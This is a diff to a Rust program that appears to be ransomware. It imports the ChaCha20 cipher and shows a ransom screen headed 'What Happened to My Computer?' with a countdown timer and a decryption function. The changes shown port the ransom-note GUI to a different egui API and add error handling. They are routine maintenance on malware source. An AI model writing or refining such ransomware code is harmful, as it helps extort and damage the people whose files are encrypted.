@@ -1,4 +1,3 @@
-use anyhow::Ok;
 use base64::{Engine as _, engine::general_purpose};
 use chacha20::ChaCha20;
 use chacha20::cipher::{KeyIvInit, StreamCipher};
@@ -207,24 +206,22 @@ impl Default for RANApp {
 }
 
 impl eframe::App for RANApp {
-    fn ui(&mut self, ui: &mut egui::Ui, _frame: &mut eframe::Frame) {
-        let ctx = ui.ctx();
-
+    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
         if self.time_left_seconds > 0.0 && !self.is_valid {
             self.time_left_seconds -= ctx.input(|i| i.stable_dt as f64);
             ctx.request_repaint();
         }
 
         // Left Panel
-        egui::Panel::left("status_panel")
+        egui::SidePanel::left("status_panel")
             .resizable(false)
-            .exact_size(280.0)
+            .default_width(280.0)
             .frame(
-                egui::Frame::side_top_panel(&ctx.global_style())
+                egui::Frame::side_top_panel(&*ctx.style())
                     .fill(Color32::from_rgb(140, 0, 0))
                     .inner_margin(20.0),
             )
-            .show_inside(ui, |ui| {
+            .show(ctx, |ui| {
                 ui.vertical_centered(|ui| {
                     ui.add_space(10.0);
                     ui.label(RichText::new("⚠️").size(40.0));
@@ -329,7 +326,7 @@ impl eframe::App for RANApp {
             });
 
         // Central Panel
-        egui::CentralPanel::default().show_inside(ui, |ui| {
+        egui::CentralPanel::default().show(ctx, |ui| {
             ui.add_space(10.0);
             ui.heading(RichText::new("What Happened to My Computer?").color(Color32::from_rgb(255, 100, 100)).size(26.0).strong());
             ui.add_space(15.0);
@@ -506,7 +503,9 @@ fn decrypt_sparse(
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
     if TEST_GUI {
-        start_gui()?;
+        if let Err(err) = start_gui() {
+            eprintln!("GUI error: {err}");
+        }
         std::process::exit(0);
     }
 
